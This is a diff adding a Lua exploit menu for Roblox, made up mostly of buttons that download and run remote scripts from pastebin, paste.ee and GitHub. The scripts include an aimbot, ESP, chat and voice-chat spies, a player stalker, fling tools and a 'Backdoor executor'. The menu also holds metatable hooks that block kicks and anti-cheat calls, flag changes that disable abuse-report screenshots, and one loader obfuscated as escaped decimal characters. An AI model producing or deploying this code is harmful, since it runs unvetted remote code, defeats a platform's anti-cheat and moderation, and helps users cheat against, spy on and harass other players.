+		local success, response = pcall(function()
+			path:ComputeAsync(getRoot(plr.Character).Position, getRoot(target.Character).Position)
+			local waypoints = path:GetWaypoints()
+			local distance 
+			for waypointIndex, waypoint in pairs(waypoints) do
+				local waypointPosition = waypoint.Position
+				hum:MoveTo(waypointPosition)
+				repeat 
+					distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
+					wait()
+				until
+				distance <= 5
+			end	 
+		end)
+		if not success then
+			plr.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(target.Character).Position)
+		end
+		until target.Character == nil or not getRoot(target.Character) or WalkTo == false
+		end
+		else
+		    Walkns = false
+			WalkTo = false
+		end		
+  end    
+})
+
+local Players = game:GetService("Players")
+local Staring
+
+Tab:AddToggle({
+    Name = "Stare",
+    Default = false,
+    Callback = function(Stare)
+        if Stare then
+            local Target = target
+            if Staring then
+                Staring:Disconnect()
+            end
+            if not Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Target.Character:FindFirstChild("HumanoidRootPart") then
+                return
+            end
+            local function StareAtTarget()
+                if Players.LocalPlayer.Character.PrimaryPart and Players:FindFirstChild(Target.Name) and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
+                    local CharPos = Players.LocalPlayer.Character.PrimaryPart.Position
+                    local tpos = Target.Character:FindFirstChild("HumanoidRootPart").Position
+                    local TPos = Vector3.new(tpos.X, CharPos.Y, tpos.Z)
+                    local NewCFrame = CFrame.new(CharPos, TPos)
+                    Players.LocalPlayer.Character:SetPrimaryPartCFrame(NewCFrame)
+                elseif not Players:FindFirstChild(Target.Name) then
+                    Staring:Disconnect()
+                end
+            end
+
+            Staring = game:GetService("RunService").RenderStepped:Connect(StareAtTarget)
+        else
+            if Staring then
+                Staring:Disconnect()
+            end
+        end
+    end    
+})
+
+Tab:AddToggle({
+	Name = "Animation Steal Player",
+	Default = false,
+	Callback = function(animsteals)
+        if animsteals == true then
+            if not plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+               return game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You can't steal in R6 games. You need to be in R15 games - R15 is required!", Duration = 5,})
+			end
+			if not PlayerTarget.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+               return game.StarterGui:SetCore("SendNotification", {Title = "Oops.", Text = "The player is in R6 animation. Try to write other player target name. Your player target should be in R15 Animation - Player R15 is required!", Duration = 15,})
+			end
+			if PlayerTarget.Character:FindFirstChild("Animate") then
+		if plr.Character:FindFirstChild("Animate") then
+				checkifmyanim = plr.Character:FindFirstChild("animstorage")
+			if checkifmyanim then
+				local z = plr.Character:FindFirstChild("Animate")
+				if z then 
+				   z:Destroy() 
+				end
+				checkifmyanim.Name = "Animate"
+				checkifmyanim.Disabled = false
+			end
+		end
+		local z = plr.Character:FindFirstChild("Animate")
+		if z then
+			z.Name = "animstorage"
+			z.Disabled = true
+		end
+		local newanim = PlayerTarget.Character.Animate:Clone()
+		newanim.Parent = plr.Character
+		newanim.Name = "Animate"
+			end
+		else
+		    animsteals = false
+			if game.Players.LocalPlayer.Character:FindFirstChild("animstorage") then
+		if game.Players.LocalPlayer.Character:FindFirstChild("Animate") then
+			game.Players.LocalPlayer.Character:FindFirstChild("Animate"):Destroy()
+		end
+		local as = game.Players.LocalPlayer.Character:FindFirstChild("animstorage")
+		as.Name = "Animate"
+		as.Disabled = false
+		end
+		end
+  end   
+})
+
+local Tab = Window:MakeTab({
+  Name = "Universal Scripts",
+  Icon = "rbxassetid://6031763428",
+  PremiumOnly = false
+})
+local Section = Tab:AddSection({
+  Name = "Scripts"
+})
+Tab:AddButton({
+  Name = "Fly",
+  Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
+    end   
+})
+Tab:AddButton({
+  Name = "Keyboard",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+    end  
+})
+Tab:AddButton({
+  Name = "Script Reacher",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Sluucker/badware/main/loader", true))()
+    end   
+})
+Tab:AddButton({
+	Name = "punch",
+	Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/punch",true))()  	
+  	end   
+})
+Tab:AddButton({
+  Name = "Esp",
+  Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()	
+    end   
+})
+Tab:AddButton({
+	Name = "Joke",
+	Callback = function()
+      	coroutine.wrap(function()
+		 local HttpService = game:GetService('HttpService')
+		 local check = "https://official-joke-api.appspot.com/jokes/programming/random"
+		 local final1 = game:HttpGet(check)
+		 local final = string.gsub(final1, "[%[%]]", "")
+		 local decoded = HttpService:JSONDecode(final)
+		 
+			  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(decoded.setup, 'All')
+		 wait(2)
+			  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(decoded.punchline, 'All')
+   end)()
+  	end   
+})
+Tab:AddButton({
+  Name = "Fling Gui",
+  Callback = function()
+ loadstring(game:HttpGet("https://rawscripts.net/raw/test-whatman-yeet-7508"))()     	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Silent Aim",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/QMOEj", true))()	
+    end   
+})
+Tab:AddButton({
+	Name = "Aimbot",
+	Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/fatesc/fates-esp/main/main.lua'))()	
+  	end   
+})
+Tab:AddButton({
+  Name = "Chat Spy",
+  Callback = function()
+      loadstring(game:HttpGet("https://pastebin.com/raw/uDJxbbkJ"))()	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Chat Logs",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/8vS5Dqdr"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Chat Bypasser",
+  Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjay/Vastral/main/Vastral.lua"))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Free Animations",
+  Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()	
+    end   
+})
+
+Tab:AddButton({
+  Name = "Shiftlock",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/zBbLeZmD"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Server Finder GUI",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/w3kXN", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Stream Sniper GUI",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/SDqxo", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Team Changer GUI",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/uQAAd", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "VoiceChat Spy GUI",
+  Callback = function()
+        getgenv().VoicechatSpySettings = {
+    TrackVoice3d = false,
+    FollowDistance = 0
+}
+
+      loadstring(game:HttpGet("https://paste.ee/r/4HQro", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Player Stalker GUI",
+  Callback = function()
+      loadstring(game:HttpGet("https://paste.ee/r/vfmOp", true))()
+    end    
+})
+Tab:AddButton({
+  Name = "Chat Translator [Request]",
+  Callback = function()
+      game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "If this doesn't work for you, then: 1) It's not for synapse x (maybe) and that uses request, which synapse x can't use it (not sure) but others for example krnl, electron, they can support this. Try with syn.request not request.", Duration = 15,})
+      loadstring(game:HttpGet("https://paste.ee/r/Rranu", true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Chat Translator [Syn.Request]",
+  Callback = function()
+      game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "If this doesn't work for you, then: 1) It's for synapse x and that uses syn.request, which nobody can use it expect synapse x. Try with request not syn.request.", Duration = 10,})
+      loadstring(game:HttpGet("https://paste.ee/r/RjC9O", true))()
+    end    
+})
+Tab:AddButton({
+  Name = "Tp Tool",
+  Callback = function()
+      mouse = game.Players.LocalPlayer:GetMouse()
+ tool = Instance.new("Tool")
+ tool.RequiresHandle = false
+ tool.Name = "Click TP"
+ tool.Activated:connect(function()
+ local pos = mouse.Hit+Vector3.new(0,2.5,0)
+ pos = CFrame.new(pos.X,pos.Y,pos.Z)
+ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+ end)
+ tool.Parent = game.Players.LocalPlayer.Backpack
+ wait(0.07)
+ local TweenService = game:GetService("TweenService")
+ local UserInputService = game:GetService("UserInputService")
+ local Players = game:GetService("Players")
+ 
+ local tool = Instance.new("Tool")
+ tool.RequiresHandle = false
+ tool.Name = "Tween Click TP"
+ local function onActivated()
+	 local mouse = Players.LocalPlayer:GetMouse()
+	 local pos = mouse.Hit + Vector3.new(0,2.5,0)
+	 local humanoidRootPart = Players.LocalPlayer.Character.HumanoidRootPart
+ 
+	 local tweenInfo = TweenInfo.new(
+		 1,
+		 Enum.EasingStyle.Quad,
+		 Enum.EasingDirection.Out,
+		 0,
+		 false,
+		 0
+	 )
+ 
+	 local tween = TweenService:Create(humanoidRootPart, tweenInfo, {
+		 CFrame = CFrame.new(pos.X, pos.Y, pos.Z)
+	 })
+ 
+	 tween:Play()
+ end
+ 
+ tool.Activated:Connect(onActivated)
+ tool.Parent = Players.LocalPlayer.Backpack
+    end
+})
+Tab:AddButton({
+  Name = "Telekinesis Tool",
+  Callback = function()
+      loadstring(game:HttpGet("https://pastebin.com/raw/vVze4jgA",true))()	
+    end   
+})
+Tab:AddButton({
+  Name = "F3X (BTOOL)",
+  Callback = function()
+      loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()	
+    end   
+})
+Tab:AddButton({
+  Name = "Admin Tools",
+  Callback = function()
+      loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Wall Walking",
+  Callback = function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/mewishmew9/scripti/main/WallWalker.txt'),true))()  	
+    end   
+})
+Tab:AddButton({
+  Name = "Rtx 1",
+  Callback = function()
+     loadstring(game:HttpGet('https://pastebin.com/raw/Bkf0BJb3'))() 	
+    end   
+})
+Tab:AddButton({
+  Name = "Rtx 2",
+  Callback = function()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/PixelatedColors/Hydrox4Roblox/main/UniversalRtx'))()
+    end
+})
+local Section = Tab:AddSection({
+  Name = "Remote Spies"
+})
+Tab:AddButton({
+	Name = "Dex",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()	
+  	end   
+})
+Tab:AddButton({
+  Name = "RemoteSpy",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/9N1Fc", true))()
+    end    
+})
+Tab:AddButton({
+  Name = "DarkSpy",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/SwZq0zCf"))()
+    end
+})
+
+Tab:AddButton({
+  Name = "FilterShark",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/Fffa4"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "FrostHook",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/z29rx"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "EngoSpy",
+  Callback = function()
+        local settings = {
+   saveCalls = false,
+   maxCallsSaved = 1000,
+   saveOnlyLastCall = true,
+   maxTableDepth = 100,
+   minimizeBind = Enum.KeyCode.RightAlt,
+   blacklistedNames = {}
+}
+loadstring(game:HttpGet("https://paste.ee/r/jsyu2"))(settings)
+    end    
+})
+
+Tab:AddButton({
+  Name = "Hydroxide",
+  Callback = function()
+        local owner = "Upbolt"
+local branch = "revision"
+
+local function webImport(file)
+    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
+end
+
+webImport("init")
+webImport("ui/main")
+    end    
+})
+
+Tab:AddButton({
+  Name = "MrSpy",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/z06zN"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "SimpleSpy",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/nfHwB"))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "Remote Grabber",
+  Callback = function()
+        loadstring(game:HttpGet("https://paste.ee/r/Dddcj"))()
+    end    
+})
+local Section = Tab:AddSection({
+  Name = "Executors"
+})
+Tab:AddButton({
+  Name = "RC7",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/FD2Team/archive/main/rc7"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Synapse X",
+  Callback = function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/QvnEA2cA"))()  	
+    end   
+})
+Tab:AddButton({
+  Name = "Backdoor executor",
+  Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Arceus X",
+  Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Executor 1",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/WmwNN8UG"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Executor 2",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/4Aqjp3mE"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Executor 3",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/CUxAx1Uk"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Executor 4",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/CtUkUr93"))()
+    end   
+})
+local Section = Tab:AddSection({
+  Name = "Bypass"
+})
+
+Tab:AddButton({
+	Name = "protection",
+	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/MainProd"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/CodexTest"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/Main"))()
+  	end    
+})
+
+ Tab:AddButton({
+	Name = "Anti-kill brick",
+	Callback = function()
+      local player = game:GetService("Players").LocalPlayer
+ local UIS = game:GetService("UserInputService")
+ local myzaza = false
+ 
+ UIS.InputBegan:Connect(function(input, GPE)
+ if GPE then return end
+ myzaza = not myzaza
+ end)
+ 
+ local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 10)
+ for _, part in ipairs(parts) do
+ part.CanTouch = myzaza
+ end	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Anti-sit",
+	Callback = function()
+      Player.Character.Humanoid:SetStateEnabled("Seated", false)
+					 Player.Character.Humanoid.Sit = true	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Anti-Fling",
+	Callback = function()
+     AntiFling = true
+
+ local function NoCollision(PLR)
+	 if AntiFling and PLR.Character then
+		 for _,x in pairs(PLR.Character:GetDescendants()) do
+			 if x:IsA("BasePart") and x.CanCollide then
+				 x.CanCollide = false
+			 end
+		 end
+	 end
+ end
+ for _,v in pairs(game.Players:GetPlayers()) do
+	 if v ~= game.Players then
+		 local antifling = game:GetService('RunService').Stepped:connect(function()
+			 NoCollision(v)
+		 end)
+	 end
+ end
+ game.Players.PlayerAdded:Connect(function()
+	 if v ~= game.Players.LocalPlayer and antifling then
+		 local antifling = game:GetService('RunService').Stepped:connect(function()
+			NoCollision(v)
+		 end)
+	 end
+ end 		
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Anti-Attach",
+	Callback = function()
+      local Tools = {}
+					 for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+						 if v:IsA("Tool") then
+							 table.insert(Tools,v:GetDebugId())
+						 end
+					 end
+					 for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+						 if v:IsA("Tool") then
+							 table.insert(Tools,v:GetDebugId())
+						 end
+					 end
+					 AAttach = game.Players.LocalPlayer.Character.ChildAdded:Connect(function(instance)
+						 if instance:IsA("Tool") and not table.find(Tools,instance:GetDebugId()) then
+							 task.wait()
+							 instance.Parent = nil
+						 end
+						 end)
+						 		
+  	end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Lag",
+  Callback = function()
+_G.Settings = {
+    Players = {
+        ["Ignore Me"] = true, 
+        ["Ignore Others"] = true
+    },
+    Meshes = {
+        Destroy = false, 
+        LowDetail = true 
+    },
+    Images = {
+        Invisible = true, 
+        LowDetail = true, 
+        Destroy = false, 
+    },
+    Other = {
+        ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
+        ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
+        ["No Explosions"] = true, -- Makes Explosion's invisible
+        ["No Clothes"] = true, -- Removes Clothing from the game
+        ["Low Water Graphics"] = true, -- Removes Water Quality
+        ["No Shadows"] = true, -- Remove Shadows
+        ["Low Rendering"] = true, -- Lower Rendering
+        ["Low Quality Parts"] = true -- Lower quality parts
+    }
+}
+loadstring(game:HttpGet("https://paste.ee/r/WXhdX"))()
+print("Anti-Lag loaded")
+    end    
+})
+Tab:AddButton({
+  Name = " bypass Anti-Cheat",
+  Callback = function()
+        local mt = getrawmetatable(game)
+local ncallsa = mt.__namecall
+  setreadonly(mt, false)
+  mt.__namecall = newcclosure(function(...)
+    local args = {...}
+    if not checkcaller() and getnamecallmethod() == "Cheat" then
+      return nil
+    end
+    return ncallsa(...)
+  end)
+  setreadonly(mt, true)
+
+print("Anti-Cheat Loaded")
+    end    
+})
+
+Tab:AddButton({
+	Name = "Anti-Afk",
+	Callback = function()
+      ANTIAFK = game.Players.LocalPlayer.Idled:connect(function()
+					 game:FindService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+					 task.wait(1)
+					 game:FindService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+					 end)		
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Anti-Void",
+	Callback = function()
+      getgenv().AntiVoid = true -- // toggle it on and off
+ 
+ -- // Services
+ local Players = game:GetService("Players")
+ 
+ -- // Vars
+ local LocalPlayer = Players.LocalPlayer
+ 
+ -- // Check if anyone has the same handle as you
+ local function toolMatch(Handle)
+	 local allPlayers = Players:GetPlayers()
+	 for i = 1, #allPlayers do
+		 -- // Vars
+		 local Player = allPlayers[i]
+		 if (Player == LocalPlayer) then continue end -- // ignore local player
+ 
+		 -- // Vars
+		 local Character = Player.Character
+		 local RightArm = Character:WaitForChild("Right Arm")
+		 local RightGrip = RightArm:FindFirstChild("RightGrip")
+ 
+		 -- // Check if they share the same Part1 Handle of the Grip
+		 if (RightGrip and RightGrip.Part1 == Handle) then
+			 return Player
+		 end
+	 end
+ end
+ 
+ -- // Manager
+ local function onCharacter(Character)
+	 local RightArm = Character:WaitForChild("Right Arm")
+ 
+	 -- // See when you equip something
+	 RightArm.ChildAdded:Connect(function(child)
+		 if (child:IsA("Weld") and child.Name == "RightGrip" and getgenv().AntiVoid) then
+			 -- // Vars
+			 local ConnectedHandle = child.Part1
+ 
+			 -- // Check if someone else has something equipped too with the same handle as you
+			 local matched = toolMatch(ConnectedHandle)
+ 
+			 -- // Destroy the tool, if someone is voiding you
+			 if (matched) then
+				 ConnectedHandle.Parent:Destroy()
+				 print(matched, "just tried to void you lol!")
+			 end
+		 end
+	 end)		
+  	end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Report",
+  Callback = function()
+        setfflag("AbuseReportScreenshotPercentage", 0)
+setfflag("DFFlagAbuseReportScreenshot", "False")
+print("Anti-Report loaded")
+    end    
+})
+
+Tab:AddButton({
+  Name = "Anti-Kick",
+  Callback = function()
+        local mt = getrawmetatable(game)
+local ncallsa = mt.__namecall
+  setreadonly(mt, false)
+  mt.__namecall = newcclosure(function(...)
+    local args = {...}
+    if not checkcaller() and getnamecallmethod() == "Kick" then
+      return nil
+    end
+    return ncallsa(...)
+  end)
+  setreadonly(mt, true)
+
+print("Anti-Kick Loaded")
+    end    
+})
+
+local Section = Tab:AddSection({
+  Name = "Esp"
+})
+
+local ESPz = loadstring(game:HttpGet("https://paste.ee/r/aFx08", true))()
+
+Tab:AddToggle({
+  Name = "ESP",
+  Default = false,
+  Callback = function(ESPD)
+        ESPz:Toggle(ESPD)
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Box",
+  Default = false,
+  Callback = function(ESPb)
+      ESPz.Boxes = ESPb
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Players",
+  Default = false,
+  Callback = function(ESPp)
+        ESPz.Players = ESPp
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Names",
+  Default = false,
+  Callback = function(ESPn)
+        ESPz.Names = ESPn
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show TeamColor",
+  Default = false,
+  Callback = function(ESPtc)
+        ESPz.TeamColor = ESPtc
+  end    
+})
+
+Tab:AddLabel("Chams")
+
+local chamsadded
+local chamsremoved
+local chamshah = {}
+
+Tab:AddToggle({
+  Name = "Chams",
+  Default = false,
+  Callback = function(Chams)
+    if Chams == true then
+            function ChamsHEH(target)
+            local faces = {"Back","Bottom","Front","Left","Right","Top"}
+      for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
+    for _, p in pairs(v.Character:GetChildren()) do
+      if p:IsA("BasePart") then
+        for _, f in pairs(faces) do
+          local a = Instance.new("BoxHandleAdornment")
+          a.Name = "EGUI"
+          a.Parent = p
+          a.Adornee = p
+          a.AlwaysOnTop = true
+          a.ZIndex = 10
+          a.Size = p.Size
+          a.Transparency = 0.3
+          a.Color3 = Color3.new(255, 255, 255)
+                    chamshah[target] = a
+        end
+      end
+    end
+end
+end
+end
+
+chamsadded = game.Players.PlayerAdded:Connect(function(v)
+    v.CharacterAdded:Connect(function()
+        ChamsHEH(v)
+    end)
+end)
+
+chamsremoved = game.Players.PlayerRemoving:Connect(function(v)
+    if chamshah[v] then
+        chamshah[v]:Destroy()
+        chamshah[v] = nil
+    end
+end)
+
+local faces = {"Back","Bottom","Front","Left","Right","Top"}
+      for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
+    for _, p in pairs(v.Character:GetChildren()) do
+      if p:IsA("BasePart") then
+        for _, f in pairs(faces) do
+          local a = Instance.new("BoxHandleAdornment")
+          a.Name = "EGUI"
+          a.Parent = p
+          a.Adornee = p
+          a.AlwaysOnTop = true
+          a.ZIndex = 10
+          a.Size = p.Size
+          a.Transparency = 0.3
+          a.Color3 = Color3.new(255, 255, 255)
+        end
+      end
+    end
+end
+end
+        else
+      Chams = false
+      for _, v in pairs(game.Workspace:GetDescendants()) do
+      if v.Name == ("EGUI") then
+        v:Remove()
+        end
+        end
+            if chamsadded ~= nil then
+        chamsadded:Disconnect()
+    end
+            if chamsremoved ~= nil then
+        chamsremoved:Disconnect()
+    end
+chamshah = {}
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Names",
+  Default = false,
+  Callback = function(NameChams)
+    if NameChams == true then
+      for _, v in pairs(game.Players:GetChildren()) do if v.Name ~= game.Players.LocalPlayer.Name then
+      local bgui = Instance.new("BillboardGui", v.Character.Head)
+  bgui.Name = ("NAMGUI")
+  bgui.AlwaysOnTop = true
+  bgui.ExtentsOffset = Vector3.new(0,3,0)
+  bgui.Size = UDim2.new(0,200,0,50)
+  local nam = Instance.new("TextLabel",bgui)
+  nam.Text = v.Name
+  nam.BackgroundTransparency = 1
+  nam.TextSize = 30
+  nam.Font = ("Arial")
+  nam.TextColor3 = Color3.new(1, 1, 1)
+  nam.Size = UDim2.new(0,200,0,50)
+  end
+  end
+        else
+      NameChams = false
+      for _, v in pairs(game.Workspace:GetDescendants()) do
+      if v.Name == ("NAMGUI") then
+        v:Remove()
+        end
+        end
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show TeamColor",
+  Default = false,
+  Callback = function(TeamColorChams)
+    if TeamColorChams == true then
+      for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+          for i,b in pairs(v.Character:GetChildren()) do
+            if b:IsA("BasePart") then
+              for i,c in pairs(b:GetDescendants()) do
+                if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
+                  c.Color = v.TeamColor
+                end
+              end
+            end
+          end
+        end	
+      end
+        else
+      TeamColorChams = false
+      for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+          for i,b in pairs(v.Character:GetChildren()) do
+            if b:IsA("BasePart") then
+              for i,c in pairs(b:GetDescendants()) do
+                if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
+                  c.Color3 = Color3.new(255, 255, 255)
+                end	
+              end	
+            end
+          end
+        end	
+      end
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Rainbow Color",
+  Default = false,
+  Callback = function(RainbowColorc)
+    if RainbowColorc == true then
+      for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+          for i,b in pairs(v.Character:GetChildren()) do
+            if b:IsA("BasePart") then
+              for i,c in pairs(b:GetDescendants()) do
+                if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
+                  local t = 5; --how long does it take to go through the rainbow
+
+local tick = tick
+local fromHSV = Color3.fromHSV
+local RunService = game:GetService("RunService")
+local Frame = script.Parent
+
+RunService:BindToRenderStep("Rainbow", 1000, function()
+  local hue = tick() % t / t
+  local color = fromHSV(hue, 1, 1)
+  c.Color3 = color
+end)
+                end	
+              end	
+            end
+          end
+        end	
+      end
+        else
+      RainbowColorc = false
+      for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+          for i,b in pairs(v.Character:GetChildren()) do
+            if b:IsA("BasePart") then
+              for i,c in pairs(b:GetDescendants()) do
+                if c.Name == "EGUI" and c:IsA("BoxHandleAdornment") then
+                  c:Destroy()
+                end
+              end
+            end
+          end
+        end	
+      end										
+  end
+  end    
+})
+Tab:AddToggle({
+  Name = "X-Ray",
+  Default = false,
+  Callback = function(Xray)
+    if Xray == true then
+              for _,i in pairs(workspace:GetDescendants()) do
+      if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
+        i.LocalTransparencyModifier = 0.75
+      end
+    end
+          else
+         Xray = false
+               for _,i in pairs(workspace:GetDescendants()) do
+      if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
+        i.LocalTransparencyModifier = 0
+      end
+    end
+  end
+  end    
+})
+
+local Tab = Window:MakeTab({
+  Name = "Scripts",
+  Icon = "rbxassetid://6031360355",
+  PremiumOnly = false
+ })
+ local Section = Tab:AddSection({
+  Name = "Scripts"
+})
+Tab:AddButton({
+	Name = "R15 to R6 (You should use it if you r15)",
+	Callback = function()
+      	loadstring(game:HttpGet(('https://pastebin.com/raw/jHGVauVX'),true))()
+  	end   
+})
+
+Tab:AddButton({
+  Name = "FE Bypass Gui (VERY OP)",
+  Callback = function()
+        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
+    end   
+})
+
+      Tab:AddButton({
+	Name = "Tool Gui",
+	Callback = function()
+      	loadstring(game:HttpGet("https://pastebin.com/raw/vr2YVyF6"))();
+  	end   
+})
+Tab:AddButton({
+	Name = "FE Neko",
+	Callback = function()
+            local Global = getgenv and getgenv() or _G
+            local setclipboard = setclipboard or print
+            Global.Reanimation = Global.Reanimation or "PermaDeath"
+            Global.FlingType = Global.FlingType or 'Mixed'
+
+            local Enabled = true
+
+            local Players = game:GetService("Players")
+            local UserInputService = game:GetService("UserInputService")
+            local CoreGui = game:GetService("CoreGui")
+            local Lighting = game:GetService('Lighting')
+            local TweenService = game:GetService('TweenService')
+
+            local Blur = Instance.new("BlurEffect")
+            Blur.Size = 1
+
+            local Camera = workspace.CurrentCamera
+
+            Global._reanimate = loadstring(game:HttpGet('https://raw.githubusercontent.com/shidemuri/coffeeware/main/reanim.lua'))()
+
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/shidemuri/coffeeware/main/nekov4.lua'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Master Hand",
+	Callback = function()
+    loadstring(game:GetObjects("rbxassetid://3040943596")[1].Source)()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Spiderbot",
+	Callback = function()
+    loadstring(game:GetObjects("rbxassetid://3040869607")[1].Source)()  	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Titan",
+	Callback = function()
+      	loadstring(game:GetObjects("rbxassetid://3600286284")[1].Source)()
+  	end   
